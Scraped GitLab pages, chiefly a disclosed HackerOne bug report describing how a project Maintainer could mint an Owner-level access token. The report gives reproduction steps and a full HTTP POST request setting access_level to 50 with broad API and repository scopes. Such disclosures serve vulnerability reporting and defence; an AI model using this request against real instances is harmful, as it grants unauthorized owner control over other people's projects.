=== Content from gitlab.com_46b71965_20250115_095241.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-1084.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-1084.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-1084.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-1084.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Mar 04, 2023

  [99d4779c](/gitlab-org/cves/-/commit/99d4779c165753b3df1319bd4c1c88c89e5568d5)
  [Publishing 0 updated advisories and 4 new advisories](/gitlab-org/cves/-/commit/99d4779c165753b3df1319bd4c1c88c89e5568d5)
  ·
  99d4779c

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 04, 2023

  99d4779c

  [Publishing 0 updated advisories and 4 new advisories](/gitlab-org/cves/-/commit/99d4779c165753b3df1319bd4c1c88c89e5568d5)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 04, 2023

Loading



=== Content from gitlab.com_9b693a35_20250115_095242.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Maintainer user can become owner of project

**[HackerOne report #1805549](https://hackerone.com/reports/1805549)** by `shubham_sohi` on 2022-12-14, assigned to [@fvpotvin](/fvpotvin "Félix Veillette-Potvin"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

I have found a way that can be used by low privileged user to become owner of project.

#### NOTE:-

You need a premium GitLab account to verify the issue.

##### Steps to reproduce

1.Login into admin account.

2.Go to `https://gitlab.com/projects/new` and click on create blank project and create a project with name P.

3.Now in project P go to `Project Information>Members` and invite user A with `Maintainer` role.

[![Screenshot_(426).png](data:image/gif;base64...)](https://user-content.gitlab-static.net/dd8daf7731aecb1c82f0f637c6216a0d342db15e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30373562353837632d343661612d343962342d623530662d6664323835663862643339302f53637265656e73686f745f28343236292e706e67)

4.Now login into user A account.

5.In project P Go to `Settings>Access Tokens`, here user A can create access token.

6.But user A can only create access token for role Maintainer, Guest, Reporter and developer but does not have permission to create access token for owner role.

7.Now run below request in user A account with group\_name and project\_P\_name.

```
POST /<-group_name->/<-project_P_name->/-/settings/access_tokens HTTP/2
Host: gitlab.com
Content-Length: 444
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, /; q=0.01
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Platform: "Windows"
Origin: https://gitlab.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://gitlab.com
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: { REDACTED }
X-Csrf-Token: { REDACTED }

resource_access_token%5Bname%5D=ksjdf&resource_access_token%5Bexpires_at%5D=2023-01-13&resource_access_token%5Baccess_level%5D=50&resource_access_token%5Bscopes%5D%5B%5D=api&resource_access_token%5Bscopes%5D%5B%5D=read_api&resource_access_token%5Bscopes%5D%5B%5D=read_repository&resource_access_token%5Bscopes%5D%5B%5D=write_repository&resource_access_token%5Bscopes%5D%5B%5D=read_registry&resource_access_token%5Bscopes%5D%5B%5D=write_registry
```

8.In response you will get new access token.

9.Now you can use this token to perform all action in project as admin.

##### Impact

`Maintainer` role user get owner privilege.

##### What is the expected *correct* behavior?

Maintainer role user should only able to create access token for Maintainer, Guest, Reporter and developer .

##### Output of checks

This bug happens on GitLab.com

#### Impact

`Maintainer` role user get owner privilege.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_(426).png](https://h1.sec.gitlab.net/a/075b587c-46aa-49b4-b50f-fd285f8bd390/Screenshot_%28426%29.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


